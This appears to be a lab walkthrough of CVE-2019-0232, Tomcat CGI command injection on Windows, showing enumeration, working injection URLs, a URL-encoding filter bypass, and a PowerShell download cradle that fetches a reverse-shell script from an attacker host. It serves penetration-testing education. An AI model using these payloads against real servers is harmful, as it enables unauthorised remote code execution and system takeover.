## CVE-2019-0232: Tomcat CGI Servlet RCE on Windows

[CVE-2019-0232](https://nvd.nist.gov/vuln/detail/CVE-2019-0232) is a critical remote code execution vulnerability affecting Apache Tomcat running on Windows when the CGI Servlet has `enableCmdLineArguments` set to `true`.  The root cause is a flaw in how the Java Runtime Environment passes command-line arguments to Windows processes. When query string parameters are forwarded to a CGI script as arguments, an attacker can inject additional OS commands using the `&` batch separator, since the CGI Servlet performs no input validation before passing the query string. 

The affected versions are: 

- Tomcat 9.0.0.M1 to 9.0.17
- Tomcat 8.5.0 to 8.5.39
- Tomcat 7.0.0 to 7.0.93

Both the CGI Servlet and `enableCmdLineArguments` are disabled by default, so this vulnerability only affects intentionally configured installations.

***

## Enumeration

Start with a full port scan to confirm the Tomcat version and check for the AJP port:

```bash
nmap -p- -sC -Pn 10.129.204.227 --open
```

```
8080/tcp open  http-proxy   Apache Tomcat/9.0.17
8009/tcp open  ajp13
```

Tomcat 9.0.17 falls within the vulnerable range, so proceed to look for CGI scripts.

***

## Finding CGI Scripts

The default CGI directory on Tomcat is `/cgi`. Use [ffuf](https://github.com/ffuf/ffuf) to fuzz for batch scripts on Windows targets. Fuzz `.cmd` first, then `.bat`:

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
```

No results. Try `.bat`:

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```

```
[Status: 200, Size: 81, Words: 14, Lines: 2, Duration: 234ms]
    * FUZZ: welcome
```

Confirm it is reachable:

```
http://10.129.204.227:8080/cgi/welcome.bat
```

```
Welcome to CGI, this section is not functional yet. Please return to home page.
```

***

## Exploitation

### Step 1: Confirm Command Injection

Append `&dir` to the URL using `&` as the batch command separator:

```
http://10.129.204.227:8080/cgi/welcome.bat?&dir
```

A directory listing returns, confirming the injection works.

### Step 2: Retrieve Environment Variables

Use `set` to dump CGI environment variables. This reveals the `PATH` variable is unset and shows the `COMSPEC` and `SCRIPT_FILENAME` values needed for further exploitation:

```
http://10.129.204.227:8080/cgi/welcome.bat?&set
```

Key values from the output:

```
COMSPEC=C:\Windows\system32\cmd.exe
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.JS;.WS;.MSC
SCRIPT_FILENAME=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
```

Since `PATH` is unset, commands like `whoami` must be called with their full path.

### Step 3: Bypass the Special Character Filter

Apache applied a regex patch that blocks special characters including backslashes and colons directly in the URL. The filter is bypassed by URL-encoding the path:

| Character | URL Encoded |
|---|---|
| `:` | `%3A` |
| `\` | `%5C` |

Full working payload for `whoami`:

```
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

This decodes on the server to `&c:\windows\system32\whoami.exe` and executes the binary. 

### Chaining to a Reverse Shell

Use the same URL-encoding technique with a PowerShell download cradle or `certutil` to drop and execute a reverse shell payload. For example, using `powershell.exe` with a full path and encoded arguments:

```
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5CWindowsPowerShell%5Cv1.0%5Cpowershell.exe+-nop+-c+"IEX(New-Object+Net.WebClient).DownloadString('http://10.10.14.15/shell.ps1')"
```

URL-encode any additional special characters in the PowerShell command before sending. A Metasploit module `exploit/windows/http/tomcat_cgi_cmdlineargs` also automates this entire chain. 

***

## Conditions Required for Exploitation

Three conditions must all be true simultaneously:

1. Tomcat is running on a Windows host
2. The CGI Servlet is enabled in `web.xml`
3. `enableCmdLineArguments` is set to `true` in the CGI Servlet configuration

Since all three are non-default settings, this vulnerability primarily affects systems that were deliberately configured to use CGI scripts. During an assessment, always check for the presence of a `/cgi` directory and any `.bat` or `.cmd` files before moving on from a Tomcat target, especially on Windows hosts.
